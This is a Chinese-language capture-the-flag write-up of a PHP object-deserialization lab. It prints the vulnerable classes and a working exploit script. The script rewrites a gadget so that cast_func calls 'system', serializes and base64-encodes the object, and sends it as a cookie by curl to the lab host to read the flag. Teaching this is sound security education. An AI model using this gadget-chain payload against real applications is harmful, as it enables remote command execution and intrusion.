# LAB - Serializable Magic Cat
###### tags: `資安` `Web`

## 題目解析
畫面中可以看到一個 unserialize 後的 cat 物件內容跟有告訴你可以看 source code。
![](https://i.imgur.com/fmkaXEt.png)

## 解題流程
從 source code 中可以看到 3 個 class。
```php=
class Magic
{
    function cast($spell)
    {
        echo "<script>alert('MAGIC, $spell!');</script>";
    }
}

// Useless class?
class Caster
{
    public $cast_func = 'intval';
    function cast($val)
    {
        return ($this->cast_func)($val);
    }
}


class Cat
{
    public $magic;
    public $spell;
    function __construct($spell)
    {
        $this->magic = new Magic();
        $this->spell = $spell;
    }
    function __wakeup()
    {
        echo "Cat Wakeup!\n";
        $this->magic->cast($this->spell);
    }
}
```

而 server 在做的事就是若你有 名為 cat 的 cookie，他就你做反序列化輸出，沒有就直接自行 new 一個並顯示。

php 在反序列化會自動執行 \_\_wakeup() 這個 magic function，這邊的 \_\_wakeup() function 是傳 spell 給 magic attrubute 的 cast() function，而 magic 這個物件是在 consturctor() 也就是 new 一個 cat 物件的時候 new 的一個 Magic 這個物件，因此我們可以自己修改一下這幾個 class。

首先可以把 Cat 的 Magic attribute　改成 new Caster 物件，然後 Caster 物件的 cast_func 是用作 cast() 裡的 function 名稱，因此我們要把 cast_func 改成 system，這樣 spell 只要設成我們想要執行的指令，序列化後做 base64 encode，當成 cookie 傳給 server，就可以透過反序列化執行 shell command。

```php=
<?php
class Magic
{
    function cast($spell)
    {
        echo "<script>alert('MAGIC, $spell!');</script>";
    }
}

class Caster
{
    public $cast_func = 'system';
    function cast($val)
    {
        return ($this->cast_func)($val);
    }
}

class Cat
{
    public $magic;
    public $spell;
    function __construct($spell)
    {
        $this->magic = new Caster();
        $this->spell = $spell;
    }
    function __wakeup()
    {
        echo "Cat Wakeup!\n";
        $this->magic->cast($this->spell);
    }
}

$cat = new Cat('cd /; cat flag_23907376917516c8');
$cat = base64_encode(serialize($cat));
//echo unserialize(base64_decode($cat));
system("curl http://h4ck3r.quest:8602/ --cookie 'cat=$cat'");
?>
```

稍微試一下就可以找到 FLAG 了！

## FLAG 截圖
![](https://i.imgur.com/hiUh9cZ.png)
